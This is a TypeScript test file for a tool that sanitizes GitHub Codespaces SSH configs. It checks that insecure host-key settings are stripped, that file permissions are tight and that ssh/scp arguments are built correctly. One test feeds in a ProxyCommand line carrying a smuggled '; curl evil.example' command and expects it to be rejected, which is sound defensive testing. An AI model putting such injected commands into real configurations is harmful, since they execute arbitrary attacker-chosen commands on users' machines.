import { mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, expect, test } from 'vitest';
import { prepareIsolatedCodespaceSshConfig } from '../src/codespaces-ssh.js';
import { buildScpUploadArgs, buildSshArgs } from '../src/transport.js';

const tempDirs: string[] = [];
afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(dir => rm(dir, { recursive: true, force: true })));
});

test('creates an isolated 0600 OpenSSH config for gh codespace ssh, strips missing codespaces.auto (#9817), and wires -F + TOFU known_hosts', async () => {
  const root = await mkdtemp(join(tmpdir(), 'router-cs-ssh-'));
  tempDirs.push(root);
  const missingAutoKey = join(root, 'nonexistent-codespaces.auto');

  const rawGhConfig = [
    'Host cs.octocat-literate-space-parakeet-77v9.main',
    '\tUser codespace',
    `\tProxyCommand /opt/homebrew/bin/gh cs ssh -c octocat-literate-space-parakeet-77v9 --stdio -- -i ${missingAutoKey}`,
    '\tUserKnownHostsFile=/dev/null',
    '\tStrictHostKeyChecking no',
    '\tControlMaster auto',
    `\tIdentityFile ${missingAutoKey}`,
    '',
  ].join('\n');

  const prepared = await prepareIsolatedCodespaceSshConfig({
    codespaceName: 'octocat-literate-space-parakeet-77v9',
    parentTempDir: root,
    runGhConfig: async () => rawGhConfig,
  });

  try {
    expect(prepared.hostAlias).toBe('cs.octocat-literate-space-parakeet-77v9.main');
    expect(prepared.sshTarget).toBe('codespace@cs.octocat-literate-space-parakeet-77v9.main');
    expect(prepared.strictHostKeyChecking).toBe('accept-new');

    const cfgStat = await stat(prepared.configFile);
    const khStat = await stat(prepared.knownHostsFile);
    expect(cfgStat.mode & 0o777).toBe(0o600);
    expect(khStat.mode & 0o777).toBe(0o600);

    const sanitizedText = await readFile(prepared.configFile, 'utf8');
    expect(sanitizedText).not.toContain('StrictHostKeyChecking no');
    expect(sanitizedText).not.toContain('/dev/null');
    expect(sanitizedText).not.toContain(missingAutoKey);
    expect(sanitizedText).toContain('ControlMaster no');
    expect(sanitizedText).toContain(
      'ProxyCommand /opt/homebrew/bin/gh cs ssh -c octocat-literate-space-parakeet-77v9 --stdio',
    );

    const sshArgs = buildSshArgs(prepared.sshTarget, ['true'], {
      configFile: prepared.configFile,
      knownHostsFile: prepared.knownHostsFile,
      strictHostKeyChecking: prepared.strictHostKeyChecking,
    });
    expect(sshArgs).toContain('-F');
    expect(sshArgs).toContain(prepared.configFile);
    expect(sshArgs).toContain('StrictHostKeyChecking=accept-new');

    const scpArgs = buildScpUploadArgs('/tmp/chk.enc', prepared.sshTarget, '/var/tmp/chk.enc', {
      configFile: prepared.configFile,
      knownHostsFile: prepared.knownHostsFile,
      strictHostKeyChecking: prepared.strictHostKeyChecking,
    });
    expect(scpArgs).toContain('-F');
    expect(scpArgs).toContain(prepared.configFile);
  } finally {
    await prepared.cleanup();
  }
});

test('preserves existing auto key path and rejects malicious ProxyCommand injection or StrictHostKeyChecking=accept-new without knownHostsFile', async () => {
  const root = await mkdtemp(join(tmpdir(), 'router-cs-ssh-sec-'));
  tempDirs.push(root);
  const existingKey = join(root, 'codespaces.auto');
  await writeFile(existingKey, 'dummy-key\n', { mode: 0o600 });

  const prepared = await prepareIsolatedCodespaceSshConfig({
    codespaceName: 'my-space-01',
    parentTempDir: root,
    runGhConfig: async () =>
      [
        'Host cs.my-space-01.main',
        '  User vscode',
        `  ProxyCommand /usr/local/bin/gh cs ssh -c my-space-01 --stdio -- -i ${existingKey}`,
        `  IdentityFile ${existingKey}`,
      ].join('\n'),
  });
  try {
    const text = await readFile(prepared.configFile, 'utf8');
    expect(text).toContain(`IdentityFile ${existingKey}`);
  } finally {
    await prepared.cleanup();
  }

  await expect(
    prepareIsolatedCodespaceSshConfig({
      codespaceName: 'my-space-01',
      parentTempDir: root,
      runGhConfig: async () =>
        [
          'Host cs.my-space-01.main',
          '  User vscode',
          '  ProxyCommand /usr/local/bin/gh cs ssh -c my-space-01 --stdio; curl evil.example',
        ].join('\n'),
    }),
  ).rejects.toThrow(/ProxyCommand/i);

  expect(() =>
    buildSshArgs('vscode@cs.my-space-01.main', ['true'], {
      strictHostKeyChecking: 'accept-new',
    }),
  ).toThrow(/knownHostsFile/i);
});
